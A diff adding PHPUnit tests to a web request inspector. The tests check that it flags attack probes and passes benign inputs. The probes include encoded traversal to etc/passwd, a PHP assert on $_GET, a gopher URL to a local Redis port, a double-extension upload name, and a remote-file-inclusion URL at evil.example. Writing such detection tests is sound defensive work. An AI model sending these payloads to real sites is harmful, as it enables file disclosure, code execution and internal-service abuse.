@@ -58,6 +58,44 @@ class ExpandedRuleCoverageTest extends TestCase
         $this->assertLessThan(25, $benign->score());
     }
 
+    public function testBlocksEncodedTraversalToSensitiveFiles(): void
+    {
+        $result = $this->inspect('get.file', 'file=%2e%2e%2f%2e%2e%2fetc%2fpasswd', 'medium');
+
+        $this->assertGreaterThanOrEqual(24, $result->score());
+        $this->assertContains('LFI_TRAVERSAL_SENSITIVE_FILE', array_column($result->toArray()['matches'], 'id'));
+    }
+
+    public function testBlocksPhpAssertSuperglobalInjectionAtHighParanoia(): void
+    {
+        $probe = $this->inspect('post.code', 'assert($_GET["cmd"])', 'high');
+        $benign = $this->inspect('post.note', 'assertiveness matters in documentation', 'high');
+
+        $this->assertGreaterThanOrEqual(18, $probe->score());
+        $this->assertContains('PHP_ASSERT_SUPERGLOBAL_CALL', array_column($probe->toArray()['matches'], 'id'));
+        $this->assertLessThan(18, $benign->score());
+    }
+
+    public function testBlocksGopherProtocolAbuseAtHighParanoia(): void
+    {
+        $probe = $this->inspect('get.url', 'url=gopher://127.0.0.1:6379/_INFO', 'high');
+        $benign = $this->inspect('get.url', 'url=https://example.com/docs', 'high');
+
+        $this->assertGreaterThanOrEqual(18, $probe->score());
+        $this->assertContains('PROTOCOL_GOPHER_URL', array_column($probe->toArray()['matches'], 'id'));
+        $this->assertLessThan(18, $benign->score());
+    }
+
+    public function testBlocksUploadDoubleExtensionEvasion(): void
+    {
+        $probe = $this->inspect('file.avatar.name', 'avatar.php.jpg', 'medium', 'file');
+        $benign = $this->inspect('file.avatar.name', 'avatar.photo.jpg', 'medium', 'file');
+
+        $this->assertGreaterThanOrEqual(25, $probe->score());
+        $this->assertContains('UPLOAD_DOUBLE_EXTENSION_SCRIPT', array_column($probe->toArray()['matches'], 'id'));
+        $this->assertLessThan(25, $benign->score());
+    }
+
     public function testStrictRemoteFileInclusionRequiresScriptLikeUrl(): void
     {
         $probe = $this->inspect('get.page', 'page=http://evil.example/shell.php', 'strict');
